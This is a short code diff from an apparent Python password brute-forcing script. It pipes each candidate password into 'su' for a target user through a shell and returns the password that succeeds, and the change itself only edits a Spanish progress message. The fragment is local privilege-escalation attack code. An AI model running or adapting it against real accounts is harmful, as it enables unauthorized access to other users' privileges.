@@ -5,7 +5,7 @@ def brute(line,user):
 
 		result = subprocess.run(["echo '{}' | su {}".format(line,user)], shell=True, capture_output=True, text=True)
 
-		print('[-]Espere comprobando claves...{}'.format(line)+" "*10,end='\r',flush=True)
+		print('[-]Espere comprobando claves...')
 
 		if(result.returncode==0):
 			return line
